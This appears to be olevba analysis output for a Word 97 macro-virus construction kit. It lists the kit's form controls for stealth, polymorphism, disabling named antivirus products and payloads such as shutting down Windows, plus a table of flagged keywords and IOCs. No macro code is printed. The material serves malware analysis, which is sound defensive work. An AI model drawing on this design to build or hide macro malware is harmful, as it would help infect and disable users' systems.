VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Stealth
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Retro
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Polymorphic
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Payload
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<���
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblMacros'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbAutoOpen'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbAutoClose'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbFileSaveAs'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbFileSave'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbFilePrint'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbEditFind'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbToolsWordCount'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblVirusName'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblss'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblSourceFileName'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblStealth'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblRetro'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblPolymorphic'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblPayload'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdMAKE'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdExit'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblInfectionMacros'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmMakeVirus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbMessageBox'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbPassword'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbBeep'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbExitWindows'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbAssistant'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbCaption'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbChangeStatusBar'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayload'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadBeep'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'SpinButton1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadBeep'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtNumberOfBeeps'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadBeep'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'1'
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadBeep'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadChangeCaption'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtCaption'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadChangeCaption'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadChangeCaption'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadChangeStatusBar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtStatusBar'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadChangeStatusBar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadChangeStatusBar'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadExitWindows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadExitWindows'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadMessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadMessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtMessageBoxTitle'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadMessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadMessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtMessageBox'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadMessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadOfficeAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtHeading'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadOfficeAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadOfficeAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtMessage'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadOfficeAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadOfficeAssistant'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadSetPassword'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtPassword'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadSetPassword'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPayloadSetPassword'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPolymorphic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'optAPMRS'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPolymorphic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmPolymorphic'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbPCCillan95'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbPCCillan97'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbNorton'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbMcAfee'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbFProt95'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbAVP'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbTBAV'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbFMacro'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmRetro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStartForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStartForm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbToolsMacro'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbFileTemplates'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbViewVBCode'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbToolsCustomize'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmStealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'frameVirusName'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'frameSourceFileName'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbStealth'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbRetro'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbPolymorphic'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'chkbPayload'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblVirusName'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'lblSourceFileName'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusBody/i04'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame2'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'opttxt'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'optBAS'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'cmdOK'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtVirusName'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName/i02'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'txtSourceFileName'" IN 'Constructor.MSWord.DW97Mvck' - OLE stream: 'Macros/frmVirusSourceName/i03'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |cmdOK_Click         |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |Mcscan32.dll        |Executable file name                         |
|IOC       |mcscan32.dll        |Executable file name                         |
|IOC       |Scan32.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

